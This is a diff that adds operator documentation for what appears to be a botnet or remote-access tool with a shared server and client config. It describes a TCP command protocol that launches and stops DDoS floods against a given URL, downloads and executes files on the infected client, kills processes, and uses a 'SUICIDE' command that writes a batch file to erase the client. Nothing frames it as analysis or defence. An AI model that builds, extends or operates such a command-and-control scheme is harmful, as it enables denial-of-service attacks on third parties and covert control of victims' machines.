@@ -1,0 +1,37 @@
+CONFIG.h are the same in Server and Client! only modify one
+
+TCP Socket Rules & Instructions:
+    Params should be delimited by ,
+    and commands in CAPS
+
+    CMDs:
+        Delim: ,
+            Example command: INIT,https://google.com,massget
+
+        INIT - Initializes DDoS
+            Params:
+                1st: URL
+                2nd: type (massget & masspost)
+                For masspost uses KB of data defined in CONFIG.h
+
+        SUICIDE - Writes a batch file to erase the client
+
+        DOWNLOAD - Downloads a file
+            Params:
+                1st: URL
+                2nd: File name
+
+        KILL - Kill process
+            Params:
+                1st: PID or File Name
+
+        EXEC - Execute files
+            Params:
+                1st: File name
+                2nd: Args
+
+        RESTART - Restart socket connection
+
+        STOP - Stops DDoS
+        
+    PING_TXT - Special text that pings, client should return "PONG_OK", otherwise close connection
